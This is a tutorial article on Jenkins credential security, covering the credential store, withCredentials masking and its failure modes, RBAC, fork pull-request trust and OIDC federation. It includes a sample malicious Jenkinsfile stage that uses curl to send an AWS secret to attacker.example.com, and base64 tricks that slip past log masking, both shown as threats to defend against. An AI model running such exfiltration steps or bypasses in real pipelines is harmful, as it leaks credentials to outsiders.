---
title: "Credentials and Security"
description: "Store and inject secrets safely in Jenkins using the credential store, withCredentials, RBAC, the Groovy sandbox, and OIDC-style short-lived AWS creds."
overview: "Hardcoded secrets in a Jenkinsfile leak the moment the build log is opened. Learn how the Jenkins credential store works, how withCredentials masks output, when masking fails, and how to move from long-lived static keys to short-lived federated credentials."
tags: ["jenkins", "credentials", "security", "rbac", "oidc"]
order: 4
id: article-cicd-jenkins-credentials-and-security
---

## Table of Contents

1. [The Secret Problem on a Self-Hosted Server](#the-secret-problem-on-a-self-hosted-server)
2. [The Operational Spine: devpolaris-orders Deploys to AWS](#the-operational-spine-devpolaris-orders-deploys-to-aws)
3. [The Credentials Store](#the-credentials-store)
4. [Binding Credentials into Builds](#binding-credentials-into-builds)
5. [How Masking Actually Works (and Where It Fails)](#how-masking-actually-works-and-where-it-fails)
6. [The Groovy Sandbox and Script Approval](#the-groovy-sandbox-and-script-approval)
7. [Authorizing Who Can Do What](#authorizing-who-can-do-what)
8. [Agent-to-Controller Access Control](#agent-to-controller-access-control)
9. [Untrusted Pull Requests in Multibranch Pipelines](#untrusted-pull-requests-in-multibranch-pipelines)
10. [From Static Keys to OIDC-Federated Credentials](#from-static-keys-to-oidc-federated-credentials)
11. [Failure Modes](#failure-modes)
12. [The Security Tradeoff](#the-security-tradeoff)

## The Secret Problem on a Self-Hosted Server

Every CI server eventually needs to prove its identity to something else. It needs to push a Docker image to ECR, run a Terraform apply against AWS, post a Slack message, or upload a coverage report to Codecov. Each of those calls requires a credential, and each credential is a piece of paper your build is allowed to wave around to get things done. Lose control of that paper and you have given an attacker the same powers your pipeline has.

If you came from the GitHub Actions article in the previous module, this story may sound familiar. The mechanics are the same, but the operational picture is very different. GitHub Actions ships a managed encrypted-secrets store, a managed runner that GitHub locked down for you, and a federated identity provider you can plug straight into AWS. With Jenkins, every one of those layers is something **you** turn on, configure, and keep patched on a server **you** operate. The default Jenkins install has a credentials store, but the encryption keys live on the controller's disk in `$JENKINS_HOME/secrets/`. If someone gets read access to that directory, the entire credential vault is compromised. There is no GitHub between you and the attacker; you are the one running the safe.

That changes how we think about three things this article covers:

- **Where secrets live.** Jenkins encrypts credentials at rest using master keys stored on the controller, so backups and disk access matter.
- **How secrets reach a build.** The Credentials Binding plugin injects them as environment variables for a single step, then unbinds them. Masking is best effort, not a guarantee.
- **Who can ask for them.** Authorization is plugin-driven (Matrix Auth, Role-Based Strategy). Out of the box, Jenkins is wide open.

The goal of this article is to walk one realistic deploy pipeline through four stages of hardening, ending at short-lived federated credentials that look almost identical to the OIDC pattern from the GitHub Actions article.

## The Operational Spine: devpolaris-orders Deploys to AWS

The team behind `devpolaris-orders` (a Node.js order-management service) has just moved their build off a developer's laptop and onto a fresh Jenkins controller. They need their pipeline to upload a built tarball to an S3 bucket called `devpolaris-orders-staging-artifacts` and then trigger an ECS deploy. Both of those calls need AWS credentials.

We will follow this pipeline through four phases:

1. **Phase 1: hardcoded keys.** The fastest thing that "works", and a complete disaster.
2. **Phase 2: the credential store with `withCredentials`.** Real masking, real isolation per step.
3. **Phase 3: a junior dev adds `set -x` to debug.** The mask leaks anyway. We see why.
4. **Phase 4: OIDC-federated short-lived creds.** No static AWS key on the controller at all.

Each phase is something you will see in real Jenkins shops, and each leaves a different blast radius if it gets compromised.

## The Credentials Store

Jenkins ships with two plugins that together make up the credentials machinery: the **Credentials Plugin** (the storage layer and the UI under Manage Jenkins → Credentials) and the **Credentials Binding Plugin** (the `withCredentials` Pipeline step that injects them into a build). Both are installed by default in any modern Jenkins controller, and the entire ecosystem of cloud plugins (AWS Credentials, Kubernetes Credentials Provider, HashiCorp Vault) plugs into the same store.

A credential has three things attached to it: a **type** (what kind of secret it holds), a **scope** (who can ask for it), and an **ID** (a string you reference from a Jenkinsfile). The type matters because Jenkins knows how to render different kinds of secrets in the UI and how to bind them to environment variables.

| Credential Type | What It Holds | Typical Use |
| :--- | :--- | :--- |
| **Secret text** | A single opaque string. | API tokens, webhook URLs, generic passwords. |
| **Username with password** | A username plus a password. | Basic-auth registries, database creds, SMTP. |
| **SSH Username with private key** | A user plus an SSH private key (and optional passphrase). | Git over SSH, agent SSH connections, deploy keys. |
| **Certificate** | A PKCS#12 keystore with private key. | Mutual TLS to internal services, code signing. |
| **Secret file** | An entire file (binary or text). | `kubeconfig`, GCP service-account JSON, cert chains. |
| **AWS Credentials** | Access key ID + secret + optional `iamRoleArn`. | AWS CLI, Terraform, anything boto3-shaped. |

The last entry comes from the **AWS Credentials Plugin** (sometimes called CloudBees AWS Credentials), not from core Jenkins. Adding it gives you a credential type that integrates cleanly with the `withAWS` step we will use in Phase 4.

### Scopes: Who Can Ask for the Secret

Every credential lives at a scope. The scope decides which builds can resolve the credential ID at runtime.

- **System.** Visible only to the controller itself, never to a build. This is where you store the SSH key the controller uses to launch agents, or the GitHub token it uses to scan multibranch repos. If a Jenkinsfile asks for a System credential, Jenkins refuses.
- **Global.** Any job on any agent can resolve the ID. Convenient and dangerous. A test job that calls `withCredentials([string(credentialsId: 'prod-aws-secret', ...)])` will succeed even if it has no business touching production.
- **Folder-scoped.** Stored on a Jenkins folder (Manage Folder → Credentials). Only jobs inside that folder can see them. This is the cleanest way to model the "staging credentials live with staging jobs" pattern, and it is the analog of GitHub Actions' Environment-scoped secrets.

The rule of thumb: System for things the controller itself uses, Folder for everything builds touch, and Global only for credentials that genuinely apply to every job (a corporate proxy password, perhaps).

### Where It All Lives on Disk

Credentials are encrypted at rest using a master key in `$JENKINS_HOME/secrets/`. The encrypted forms live in `$JENKINS_HOME/credentials.xml` (Global scope) or under `$JENKINS_HOME/jobs/<folder>/credentials.xml` for folder-scoped credentials. If you back up `$JENKINS_HOME` to S3 and forget to encrypt the bucket, you have just shipped your entire credential vault and the master key to the same place. Configuration as Code (JCasC) helps here: it lets you commit credential **structure** to Git while keeping the secret values themselves in environment variables or a dedicated secret store.

## Binding Credentials into Builds

There are two ways to inject a stored credential into a build step. They look slightly different, but they both end up calling the same Credentials Binding plugin under the hood.

### Phase 1: The Hardcoded Disaster

Before we look at the right answer, here is what `devpolaris-orders` originally shipped:

```groovy
pipeline {
    agent { label 'linux-docker' }
    stages {
        stage('Deploy') {
            steps {
                sh '''
                    export AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
                    export AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
                    aws s3 cp build/orders-1.4.2.tar.gz s3://devpolaris-orders-staging-artifacts/
                '''
            }
        }
    }
}
```

The build log is straightforward and very, very bad:

```text
[Pipeline] sh
+ export AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
+ export AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
+ aws s3 cp build/orders-1.4.2.tar.gz s3://devpolaris-orders-staging-artifacts/
upload: build/orders-1.4.2.tar.gz to s3://devpolaris-orders-staging-artifacts/orders-1.4.2.tar.gz
```

That key is now in the build log, the Jenkinsfile, the Git history of the repo, every developer's laptop with a clone, every fork, every search-indexed mirror, and the controller's archived build records under `$JENKINS_HOME/jobs/<job>/builds/<n>/log`. Anyone with Read permission on this Jenkins job (which, on a fresh install, often means "logged-in users") can fetch it. Treat it as compromised the moment you save the file.

### Phase 2: `withCredentials`

The fix is to store the AWS key and secret as two **Secret text** credentials in the store (with IDs `aws-staging-key-id` and `aws-staging-secret`), then bind them inside the build:

```groovy
pipeline {
    agent { label 'linux-docker' }
    stages {
        stage('Deploy to Staging') {
            steps {
                withCredentials([
                    string(credentialsId: 'aws-staging-key-id',   variable: 'AWS_ACCESS_KEY_ID'),
                    string(credentialsId: 'aws-staging-secret',   variable: 'AWS_SECRET_ACCESS_KEY')
                ]) {
                    sh 'aws s3 cp build/orders-1.4.2.tar.gz s3://devpolaris-orders-staging-artifacts/'
                }
            }
        }
    }
}
```

The bracketed list inside `withCredentials` is a list of **bindings**. Each binding takes a credential ID and turns it into one or more environment variables. `string` is for Secret text, `usernamePassword` is for Username with password, `sshUserPrivateKey` is for SSH keys, `file` is for Secret file, and so on. Inside the closure, the variables exist; outside the closure, Jenkins clears them from the environment.

The build log of the Phase 2 job is dramatically calmer:

```text
[Pipeline] withCredentials
[Pipeline] {
[Pipeline] sh
+ aws s3 cp build/orders-1.4.2.tar.gz s3://devpolaris-orders-staging-artifacts/
upload: build/orders-1.4.2.tar.gz to s3://devpolaris-orders-staging-artifacts/orders-1.4.2.tar.gz
[Pipeline] }
[Pipeline] // withCredentials
```

Notice what is **not** there: the values of `AWS_ACCESS_KEY_ID` and `AWS_SECRET_ACCESS_KEY`. The shell trace at the top of `sh` steps still runs, but the environment-variable assignment that the binding does happens before Bash sees the command, so there is nothing for `set -x` to print. If `aws s3 cp` had echoed the key for some reason, the masker would have replaced it with `****`.

### The Declarative `environment` Form

The same binding can be expressed inside a declarative `environment` block, which is shorter when you only need the credential for the whole stage:

```groovy
pipeline {
    agent { label 'linux-docker' }
    stages {
        stage('Deploy to Staging') {
            environment {
                AWS_ACCESS_KEY_ID     = credentials('aws-staging-key-id')
                AWS_SECRET_ACCESS_KEY = credentials('aws-staging-secret')
            }
            steps {
                sh 'aws s3 cp build/orders-1.4.2.tar.gz s3://devpolaris-orders-staging-artifacts/'
            }
        }
    }
}
```

The `credentials()` helper looks at the credential's type and binds it appropriately. For a Username with password credential, it actually creates **three** variables: the named one (with `username:password`), a `_USR` variant, and a `_PSW` variant. That convenience can surprise you if you write `environment { DOCKER_AUTH = credentials('hub') }` and then wonder why `DOCKER_AUTH_PSW` is also in the environment.

The explicit `withCredentials` step is more verbose but more obvious. Use it when only one step needs the secret, or when a step is sensitive enough that you want the binding-and-unbinding clearly bracketed in the source.

## How Masking Actually Works (and Where It Fails)

The "masking" you saw in the Phase 2 log is the work of a small log filter that the Credentials Binding plugin installs around your build. Roughly:

```mermaid
flowchart TD
    A[Pipeline reaches withCredentials] --> B[Controller decrypts credential]
    B --> C[Plugin registers secret strings<br/>with the build's log filter]
    C --> D[Step runs; stdout/stderr stream<br/>through the filter]
    D --> E{Output contains<br/>a registered secret?}
    E -->|Yes| F[Replace with ****]
    E -->|No| G[Pass through unchanged]
    F --> H[Write to build log]
    G --> H
    H --> I[Step finishes]
    I --> J[Plugin removes binding;<br/>env var disappears]
```

The filter does **substring matching** on the registered secret string. That is enough to handle the common case (a tool that accidentally echoes `$AWS_SECRET_ACCESS_KEY`) but it has four well-known failure modes that you need to internalize.

### Bypass 1: `set -x` Before the Binding

If a junior developer adds `set -x` (or runs the script with `bash -x`) and then echoes the variable manually, the trace prints the **expanded** value. Jenkins sees the masked value flow through the filter and replaces it. Good. But if the value is interpolated into a longer string, the masker still does substring matching, so it usually still works. The dangerous case is when the developer **prefixes** the secret. Watch this:

```groovy
withCredentials([string(credentialsId: 'aws-staging-secret', variable: 'AWS_SECRET_ACCESS_KEY')]) {
    sh '''
        set -x
        echo "secret prefix: AWS=${AWS_SECRET_ACCESS_KEY}"
    '''
}
```

The build log:

```text
+ echo 'secret prefix: AWS=****'
secret prefix: AWS=****
```

The masker caught it. Now the developer "tries to debug" by base64-encoding the secret to "see what it really is":

```groovy
withCredentials([string(credentialsId: 'aws-staging-secret', variable: 'AWS_SECRET_ACCESS_KEY')]) {
    sh 'echo -n "$AWS_SECRET_ACCESS_KEY" | base64'
}
```

The output is a base64 string the masker has never seen. It is not registered, so it is not masked:

```text
+ echo -n ****
+ base64
d0phbHJYVXRuRkVNSS9LN01ERU5HL2JQeFJmaUNZRVhBTVBMRUtFWQ==
```

Anyone who reads the build log can decode that line and recover the original secret. Substring matching does not protect against transformations; it only protects against the original bytes appearing.

### Bypass 2: Structured Output

`jq` and other JSON tools love to pretty-print. If your tool returns a JSON document that contains the secret as a value, the masker might mask the raw bytes but miss the JSON-escaped form (escaped forward slashes, Unicode escapes for special characters):

```text
{
  "AccessKey": {
    "AccessKeyId": "AKIAIOSFODNN7EXAMPLE",
    "SecretAccessKey": "wJalrXUtnFEMI\/K7MDENG\/bPxRfiCYEXAMPLEKEY"
  }
}
```

If the registered secret is `wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY` (with literal slashes), the JSON-escaped form `wJalrXUtnFEMI\/K7MDENG\/bPxRfiCYEXAMPLEKEY` (with `\/`) is a different byte sequence, and the masker may not catch it.

### Bypass 3: Format Characters and Whitespace

Secrets that happen to contain newlines or control characters (rare in API tokens, common in PEM-formatted private keys) can be split across log lines. The masker matches whole strings, so a `BEGIN RSA PRIVATE KEY` that is line-wrapped at 64 columns will not match a registered single-line variant.

### Bypass 4: Forwarding to External Systems

Masking only protects the **Jenkins build log**. If your build forwards stdout to a Slack channel via a webhook, or pushes the JUnit XML to an S3 bucket, the masker is no longer in the path. Whatever leaves the agent leaves it raw.

The lesson is not "masking is broken." It is "masking is the last line of defense, not the first." The first line is **never write the secret to stdout in the first place**. Tools that fail this rule (looking at you, anything that prints a verbose `--debug` log of HTTP headers including `Authorization: Bearer <token>`) need to be patched, wrapped, or replaced.

## The Groovy Sandbox and Script Approval

Jenkins Pipeline scripts are Groovy code, and Groovy can do anything Java can do, including read arbitrary files on the controller and call `Runtime.exec()`. That is a problem if a non-admin user can edit a Jenkinsfile, because the Jenkinsfile runs (in part) on the controller itself.

The defense is the **Groovy sandbox** (provided by the Script Security plugin). When a Pipeline executes, every method call is checked against an allowlist of safe operations. Calls outside that list raise a `RejectedAccessException` and the build fails with a message like:

```text
org.jenkinsci.plugins.scriptsecurity.sandbox.RejectedAccessException:
Scripts not permitted to use staticMethod java.lang.Runtime getRuntime
```

If a Jenkins administrator decides the call is actually safe (perhaps the pipeline genuinely needs to read a config file from disk), they go to **Manage Jenkins → In-process Script Approval** and see a queue:

```text
Pending signature approvals
  staticMethod java.lang.Runtime getRuntime           [Approve] [Approve assuming RO] [Deny]
  method java.io.File text                            [Approve] [Approve assuming RO] [Deny]

Approved signatures:
  method hudson.model.Run getNumber
  ...
```

Approving is a deliberate, audited action. The administrator is saying "I have read this signature and I accept the risk that any Pipeline can now use it." A junior developer cannot self-approve their way past the sandbox.

Two practical notes:

- **Shared library code** can be marked as trusted (loaded outside the sandbox) when configured globally. Folder-scoped libraries run inside the sandbox like any Jenkinsfile. We cover the difference in detail in the shared-libraries article.
- **Scripted Pipelines** (the older `node { ... }` style) are sandboxed exactly like declarative ones. The sandbox has nothing to do with Pipeline syntax; it is purely about which Java methods Groovy code is allowed to call.

## Authorizing Who Can Do What

Out of the box, a fresh Jenkins controller asks you to pick an **authorization strategy** during setup. The default ("Logged-in users can do anything") is what most homelab tutorials end up at. For any team larger than one, it is wrong.

Two plugins do almost all the real work in production:

### Matrix Authorization Strategy

The **Matrix Authorization Strategy** plugin (version 3.2.8 at the time of writing, requires Jenkins 2.479.3 or newer) gives you a permission matrix: a grid of users/groups across the top and permissions down the side. You tick the boxes you want each principal to have.

A small worked example for `devpolaris-orders`:

| User / Group         | Overall Read | Job Read | Job Build | Job Configure | Job Delete | Job Workspace | Job Cancel |
| :------------------- | :----------: | :------: | :-------: | :-----------: | :--------: | :-----------: | :--------: |
| `@devpolaris-platform`  | y            | y        | y         | y             | y          | y             | y          |
| `@devpolaris-orders`    | y            | y        | y         | y             |            | y             | y          |
| `@devpolaris-readonly`  | y            | y        |           |               |            | y             |            |
| `anonymous`          |              |          |           |               |            |               |            |

This is enough on a small team but does not scale. With 30 services and 100 engineers, the matrix becomes unmanageable.

### Role-Based Authorization Strategy

The **Role-Based Authorization Strategy** plugin (release 840.v206ff7f7312e from December 2025, also requires 2.479.3 or newer) introduces three layers of roles you can define and assign:

- **Global roles** apply to overall Jenkins permissions.
- **Project roles** match jobs by regex and grant per-job permissions.
- **Agent roles** match agents by regex and grant per-agent permissions.

You define a role like `service-developer` once, give it the right permissions, then attach it to all the user accounts that should have it. When permissions need to change, you update the role rather than editing 100 user rows. This plugin is the de-facto standard for medium-and-larger Jenkins shops.

Both plugins integrate with **Configuration as Code (JCasC)**, which means you can commit the entire authorization scheme to Git and review changes via pull request. The plugin file under `dev-roadmaps/cicd/jenkins/plugins-and-configuration.md` covers the JCasC YAML; here we just note that the matrix or role assignments live in `jenkins.yaml` and are reproducible.

## Agent-to-Controller Access Control

A subtle attack surface in Jenkins is the line between agent and controller. An agent runs builds; some of those builds may be for code from contributors you do not entirely trust. If a malicious build can call into the controller's JVM, it can read other jobs' credentials and configs.

Jenkins addresses this with the **Agent-to-Controller Security Subsystem**. Modern controllers ship with this enabled by default. It enforces:

- **Filename rules.** Code on an agent can read or write paths in its own workspace, but cannot reach into `$JENKINS_HOME` on the controller through `FilePath` calls.
- **Callable allowlists.** Only specific serialized callables can be sent from agent to controller; arbitrary `MasterToSlaveCallable`-flavored payloads are blocked.

You will know this is engaged when a poorly-written plugin or a custom script tries to do something dodgy and the controller log shows:

```text
java.lang.SecurityException: Sending build/private-key.pem from agent to controller is rejected:
  /var/lib/jenkins/secrets/master.key cannot be read or written
```

The fix is almost never to disable the subsystem (an option exists; do not take it). The fix is to redesign the step so the secret-handling stays on the controller, with only the non-secret parts sent to the agent.

## Untrusted Pull Requests in Multibranch Pipelines

A Multibranch Pipeline scans a Git repository, finds every branch and pull request that has a `Jenkinsfile`, and creates a job for each. That is enormously convenient for branches in your own repo. It is dangerous for **pull requests from forks**, because anyone on the internet can open a PR with a malicious `Jenkinsfile`.

Imagine a contributor opens a PR that modifies the existing pipeline to:

```groovy
pipeline {
    agent any
    stages {
        stage('exfil') {
            environment {
                AWS_SECRET_ACCESS_KEY = credentials('aws-staging-secret')
            }
            steps {
                sh 'curl -X POST https://attacker.example.com/sink -d "$AWS_SECRET_ACCESS_KEY"'
            }
        }
    }
}
```

If the multibranch project blindly runs Jenkinsfiles from forks, this PR will exfiltrate `aws-staging-secret` the first time Jenkins polls the repo.

The **GitHub Branch Source plugin** handles this with **Trust** levels on its fork pull-request discovery trait. The current options are:

| Trust level | What it does |
| :--- | :--- |
| **Nobody** | All fork PRs are untrusted. Their `Jenkinsfile` is replaced by the one from the target branch on the origin repo. PR builds run, but the pipeline they run is the maintainer-controlled one. |
| **From users with Admin or Write permission** | The default, and the recommended setting. PRs from contributors with write or admin access to the origin repo are trusted; everyone else gets the Nobody treatment. |
| **Forks in the same account** | Trust PRs from forks owned by the same user/org as the origin. |
| **Everyone** | All PR Jenkinsfiles are trusted. **Never use this on a public repo.** The plugin shows a warning when you select it. |

The plugin's default was deliberately moved to the more secure setting some releases back. If you inherit an older Jenkins setup, audit every Multibranch Pipeline's Trust level under **Configure → Branch Sources → Discover pull requests from forks → Trust**.

The structural defense, even when Trust is set safely, is to **gate credentials on branch identity**. Wrap any `withCredentials` (or any `environment { credentials(...) }`) block in a `when` clause:

```groovy
pipeline {
    agent { label 'linux-docker' }
    stages {
        stage('Test') {
            steps { sh 'npm ci && npm test' }
        }
        stage('Deploy to Staging') {
            when { branch 'main' }
            steps {
                withCredentials([
                    string(credentialsId: 'aws-staging-key-id', variable: 'AWS_ACCESS_KEY_ID'),
                    string(credentialsId: 'aws-staging-secret', variable: 'AWS_SECRET_ACCESS_KEY')
                ]) {
                    sh './deploy.sh'
                }
            }
        }
    }
}
```

PR builds run the test stage and stop. The deploy stage is invisible to them; the credentials are never bound. Combine this with a Trust level of "From users with Admin or Write permission" and the failure mode of a malicious fork is reduced to "the test job ran briefly on your agent", which is uncomfortable but bounded.

## From Static Keys to OIDC-Federated Credentials

Even our Phase 2 pipeline still has long-lived `AWS_ACCESS_KEY_ID` and `AWS_SECRET_ACCESS_KEY` values sitting in the Jenkins credential store. They have to be rotated by hand, the blast radius of a leak is "everything that role can do for as long as the keys live", and discovering which build leaked them is forensic guesswork.

The fix is the same idea as the GitHub Actions OIDC story from the previous module: instead of storing a static credential, the pipeline proves its identity to AWS at runtime and receives a short-lived token in exchange. There are two practical paths on Jenkins.

### Path A: Run the Controller (or Agents) on EC2 with an IAM Role

If your Jenkins agents are EC2 instances with an instance profile attached, the AWS SDK already picks up that role from the instance metadata service. The **AWS Credentials Plugin** has a credential type that says "use the host's instance profile" rather than storing a key. Combined with the `withAWS` step from the **Pipeline: AWS Steps** plugin, you can chain role assumptions inside the build:

```groovy
pipeline {
    agent { label 'linux-docker-ec2' }
    stages {
        stage('Deploy to Staging') {
            when { branch 'main' }
            steps {
                withAWS(role: 'devpolaris-orders-staging-deploy', roleAccount: '123456789012', region: 'us-east-1') {
                    sh 'aws s3 cp build/orders-1.4.2.tar.gz s3://devpolaris-orders-staging-artifacts/'
                }
            }
        }
    }
}
```

`withAWS` calls `sts:AssumeRole` from the agent's instance profile into the deploy role, scoped to this stage only. The credentials live for an hour at most and never touch the Jenkins disk. The role's trust policy can additionally constrain `sts:ExternalId` so only **this** Jenkins controller can assume it.

### Path B: True OIDC Federation

If your Jenkins is running anywhere with a publicly verifiable JWT issuer (EKS with IRSA, the open-source [`oidc-provider`](https://plugins.jenkins.io/oidc-provider) plugin, or an enterprise SSO that mints OIDC tokens for workloads), you can register Jenkins itself as a federated identity provider in IAM. The trust policy looks structurally identical to the GitHub Actions one we walked through in `cicd/github-actions/environments-and-security.md`:

```json
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Principal": { "Federated": "arn:aws:iam::123456789012:oidc-provider/jenkins.devpolaris.example.com" },
    "Action": "sts:AssumeRoleWithWebIdentity",
    "Condition": {
      "StringEquals": {
        "jenkins.devpolaris.example.com:aud": "sts.amazonaws.com"
      },
      "StringLike": {
        "jenkins.devpolaris.example.com:sub": "job/devpolaris-orders/main:*"
      }
    }
  }]
}
```

The `sub` condition restricts which Jenkins jobs may assume the role. The pipeline uses the issued JWT to call `sts:AssumeRoleWithWebIdentity` and never sees a static credential at all.

Path B is what GitHub Actions gives you for free. On Jenkins, you build it yourself, but the threat model that comes out the other side is the same: no long-lived AWS keys, audit trail per assumed role, and credentials that expire automatically when the build finishes.

## Failure Modes

### The `set -x` Mask Bypass

A developer can bypass the masker by transforming the secret. Repeat from the masking section because it bites teams over and over:

```groovy
withCredentials([string(credentialsId: 'aws-staging-secret', variable: 'AWS_SECRET_ACCESS_KEY')]) {
    sh 'echo -n "$AWS_SECRET_ACCESS_KEY" | base64'
}
```

```text
+ echo -n ****
+ base64
d0phbHJYVXRuRkVNSS9LN01ERU5HL2JQeFJmaUNZRVhBTVBMRUtFWQ==
```

Diagnosis: read your own build logs after merging anything that touches credentials. If you see `base64`, `xxd`, `od`, `jq`, or any output longer than three lines coming from a step that has a credential bound, treat it as a leak until proven otherwise. The fix is structural: rotate the credential immediately, then add a lint check (a pre-merge hook, or a Jenkinsfile linter) that fails the build when shell code inside `withCredentials` invokes any of the above tools.

### A Fork PR Steals Staging Creds

A multibranch project for a public-ish repo had Trust set to "Everyone" by an inherited admin. A contributor opened a PR that replaced the deploy stage with:

```groovy
stage('exfil') {
    steps {
        withCredentials([string(credentialsId: 'aws-staging-secret', variable: 'AWS_SECRET_ACCESS_KEY')]) {
            sh 'curl -X POST https://attacker.example.com/sink -d "$AWS_SECRET_ACCESS_KEY"'
        }
    }
}
```

The PR build ran on the next scan and succeeded. The attacker's webhook received the secret and it left the masker far behind on the way out the door.

The fix is two-layered:

1. **Branch source.** Set the Multibranch Pipeline's **Discover pull requests from forks → Trust** to `From users with Admin or Write permission`. Save. Re-scan. Untrusted PRs now run the maintainer's `Jenkinsfile` from the target branch, not the contributor's.
2. **Pipeline.** Gate credential-bearing stages on `when { branch 'main' }` (or on an environment variable like `CHANGE_ID == null`, which is true only for non-PR builds). This way, even a maintainer accidentally introducing a `withCredentials` block in a PR cannot exfiltrate, because the stage never runs for PR builds.

### Forgotten Rotation

Static credentials in the Jenkins store will keep working until somebody deletes them. A common pattern is "set up the Jenkins-deployer IAM user once, paste the keys, leave the company". Three years later that user still has `AdministratorAccess` and the keys still work. Rotate static keys on a calendar (90 days is a common cadence) or move that credential to Path A or Path B above so rotation becomes irrelevant.

### Plugin Authorization Bypasses

Jenkins has a long history of plugin CVEs that allow an authenticated user to read or use credentials they were not granted. Subscribe to the **Jenkins Security Advisories** mailing list and patch on the day advisories are published. Because the plugin ecosystem is large and uneven, "I will upgrade next quarter" is not a defensible posture for a controller that holds production credentials.

## The Security Tradeoff

| Approach | Operational Effort | Blast Radius if Leaked | Audit Story |
| :--- | :--- | :--- | :--- |
| **Hardcoded in Jenkinsfile** | None. | Total. Every collaborator and every cached log has the secret. | None. |
| **Global credential store + `withCredentials`** | Low. Rotate on a calendar. | Bounded by the credential's IAM policy, but persistent until rotated. | Build log shows `withCredentials` block and which credential ID was used. |
| **Folder-scoped credentials** | Medium. Maintain folders that mirror staging/production. | Smaller: only jobs in the folder ever bind the secret. | Same as above plus the folder boundary makes accidental cross-use impossible. |
| **`withAWS` from an EC2 instance role** | Medium-high. Set up IAM trust, bake AMIs or containers. | Token expires within an hour. | CloudTrail logs `AssumeRole` per stage. |
| **Full OIDC federation (Path B)** | High initially. JWKS endpoint, IAM identity provider, trust policies per pipeline. | Same as `withAWS`, plus claim-based scoping per job. | Strongest. CloudTrail shows the JWT subject (job and branch) on every API call. |

The progression is a ladder, not a switch. Most teams should aim to replace hardcoded credentials with `withCredentials` on day one, move staging-grade secrets into folder scopes within a few weeks, and migrate the highest-risk credentials (production AWS, signing keys) to short-lived federated tokens within a quarter. The middle of that ladder is fine for a long time; the bottom is not, and the top is the model the rest of the industry is converging on.

The single most important rule: **never store a credential in a place where a Jenkinsfile from an untrusted contributor can read it.** Everything in this article is variations on enforcing that rule. Folder scopes enforce it geographically. Trust levels enforce it socially. OIDC federation enforces it temporally. Pick the combination that matches the value of the thing the credential protects, and budget the operational work accordingly.

---

**References**

- [Jenkins Plugin: Credentials Binding](https://plugins.jenkins.io/credentials-binding/) - Documentation for the `withCredentials` step, supported binding types, and masking behavior.
- [Jenkins Pipeline Steps: Credentials Binding](https://www.jenkins.io/doc/pipeline/steps/credentials-binding/) - The Pipeline syntax reference for `withCredentials`, `usernamePassword`, `sshUserPrivateKey`, `file`, and friends.
- [Jenkins Plugin: AWS Credentials](https://plugins.jenkins.io/aws-credentials/) - The credential type that integrates AWS access keys (and instance-profile reuse) with the credential store.
- [Jenkins Plugin: Pipeline AWS Steps](https://plugins.jenkins.io/pipeline-aws/) - Provides the `withAWS` step for scoped role assumption inside Pipeline stages.
- [Jenkins Plugin: Role-based Authorization Strategy](https://plugins.jenkins.io/role-strategy/) - Role-grouped permissions, the de-facto standard for medium and larger Jenkins shops.
- [Jenkins Plugin: Matrix Authorization Strategy](https://plugins.jenkins.io/matrix-auth/) - Per-user permission matrix, including the project-based variant for folder-scoped permissions.
- [Jenkins Plugin: GitHub Branch Source](https://plugins.jenkins.io/github-branch-source/) - Multibranch discovery for GitHub repos, including the fork PR Trust levels referenced in the multibranch section.
- [Jenkins Docs: Securing Jenkins](https://www.jenkins.io/doc/book/security/) - The umbrella docs for authorization, agent-to-controller security, and Script Security.
- [Jenkins Security Advisories](https://www.jenkins.io/security/advisories/) - The canonical list of Jenkins and plugin CVEs; subscribe and patch promptly.
